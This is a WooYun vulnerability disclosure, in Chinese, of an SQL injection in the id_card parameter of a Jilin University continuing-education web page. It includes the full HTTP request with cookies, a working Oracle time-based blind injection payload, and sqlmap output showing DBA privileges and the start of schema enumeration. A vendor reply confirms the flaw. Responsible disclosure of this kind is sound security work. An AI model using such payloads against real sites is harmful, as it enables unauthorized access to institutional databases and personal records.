wybug_title: 吉林大学某站SQL注入 (DBA权限)
wybug_detail:
漏洞详情 披露状态：   									2015-11-30：	细节已通知厂商并且等待厂商处理中									2015-11-30：	厂商已经确认，细节仅向厂商公开									2015-12-10：	细节向核心白帽子及相关领域专家公开									2015-12-20：	细节向普通白帽子公开									2015-12-30：	细节向实习白帽子公开									2016-01-14：	细节向公众公开  简要描述： RT 详细说明：  
http://dec.jlu.edu.cn 吉林大学继续教育学院

GET /baozi/work/pub/cjcx_do.jsp?Submit=%b2%e9%20%20%d1%af&id_card=-1&s_name=fbgnnaak HTTP/1.1X-Requested-With: XMLHttpRequestReferer: http://dec.jlu.edu.cnCookie: JSESSIONID=cadhiA1RZUHH6b1KiUdfv; LoginName=ueevknad; LoginType=studentstatus; Ticket=9291e9e4a7c5fe86cf38901134c35a2e; sid=97a55a58-fa53-4f45-b919-3323826efaf5; ST=Khrr3yNlwZ5vylTml2ubALdc/yivdOrsykv+PhLSoqs=; AC=4djJgSfEq+c=; _jldxcms=71sJLVICH4; LoginName=ueevknad; LoginType=studentstatusHost: dec.jlu.edu.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*
 id_card参数存在注入
sqlmap resumed the following injection point(s) from stored session:---Parameter: id_card (GET)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: Submit=%b2%e9  %d1%af&id_card=-1' AND 2672=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(118)||CHR(72)||CHR(106),5) AND 'daxM'='daxM&s_name=fbgnnaak---web application technology: Apacheback-end DBMS: Oraclecurrent user:    'DEC_YCJSB'current schema (equivalent to database on Oracle):    'DEC_YCJSB'current user is DBA:    True
跑的太慢了,没跑完。。。
[17:38:24] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[17:38:24] [INFO] fetching database (schema) names[17:38:24] [INFO] fetching number of databases[17:38:24] [INFO] retrieved: 18[17:38:41] [INFO] retrieved: CTXS[17:39:46] [ERROR] invalid character detected. retrying..[17:39:46] [WARNING] increasing time delay to 4 secondsY[17:40:17] [ERROR] invalid character detected. retrying..[17:40:17] [WARNING] increasing time delay to 5 seconds[17:40:31] [ERROR] invalid character detected. retrying..[17:40:31] [WARNING] increasing time delay to 6 secondsS[17:40:55] [INFO] retrieved: D
   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-11-30 16:45 厂商回复： 谢谢。。这系统做的太烂了，没办法，又被报一次，不好意思了。。谢谢路人甲。。 最新状态： 暂无
